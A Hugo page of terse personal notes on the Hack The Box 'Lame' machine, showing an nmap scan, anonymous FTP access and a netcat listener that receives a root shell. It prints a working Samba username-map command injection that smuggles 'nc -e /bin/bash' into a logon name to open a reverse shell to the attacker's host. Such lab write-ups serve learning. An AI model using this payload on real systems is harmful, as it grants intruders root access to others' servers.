---
### The title for the content.
title: "Lame"
### If set, this will be used for the page's menu entry (instead of the `title` attribute)
# menuTitle : "lame"
### The title of the page in menu will be prefixed by this HTML content
# pre : ""
### The title of the page in menu will be postfixed by this HTML content
# post : ""
### The description for the content.
description: "Notes from the Lame machine on HTB."
### The datetime assigned to this page.
date : 2020-03-10T16:43:47+01:00
### Appears as the tail of the output URL. A value specified in front matter will override the segment of the URL based on the filename.
# slug : "lame"
### Aliases can be used to create redirects to your page from other URLs.
# aliases : [""]
### Display name of this page modifier. If set, it will be displayed in the footer.
# LastModifierDisplayName : ""
### Email of this page modifier. If set with LastModifierDisplayName, it will be displayed in the footer
# LastModifierEmail : ""
### Table of content (toc) is enabled by default. Set this parameter to true to disable it.
# disableToc : true
### Set the page as a chapter, changing the way it's displayed
# chapter : true
### Hide a menu entry by setting this to true
# hidden : true
### If true, the content will not be rendered unless the --buildDrafts flag is passed to the hugo command.
# draft : true
### Used for ordering your content in lists. Lower weight gets higher precedence. So content with lower weight will come first.
### 0 does nothing !
weight : 0
### Used to tag content. By default this is inherited using cascading from _index.md files
### Only set of you want to overwrite these inherited values.
# tags : [""]
---

## lame

### where you at

10.10.10.3

### what you got

```bash
# Nmap 7.60 scan initiated Wed Jan 22 15:42:48 2020 as: nmap -oX - -sS -T4 -oN /home/justin-p/Documents/htb/Lame/scans/simple_tcp.nmap -oG /home/justin-p/Documents/htb/Lame/scans/simple_tcp.gnmap 10.10.10.3
Nmap scan report for 10.10.10.3
Host is up (0.028s latency).
Not shown: 996 filtered ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

# Nmap done at Wed Jan 22 15:42:58 2020 -- 1 IP address (1 host up) scanned in 10.11 seconds
```

#### ftp

```bash
justin-p@FapTop:~/Documents/htb/Lame$ ftp -p 10.10.10.3
Connected to 10.10.10.3.
220 (vsFTPd 2.3.4)
Name (10.10.10.3:justin-p): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
227 Entering Passive Mode (10,10,10,3,176,200).
150 Here comes the directory listing.
226 Directory send OK
```

IPC Service (lame server (Samba 3.0.20-Debian))

```bash
justin-p@FapTop:~/Documents$ nc -nlvp 9999
Listening on [0.0.0.0] (family 0, port 9999)
Connection from 10.10.10.3 37851 received!
whoami
root

──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
root@FapTop:~/Documents/htb/Lame# python smbtool.py 10.10.10.3
(logon “./=`nohup nc -e /bin/bash 10.10.14.7 9999`")
```
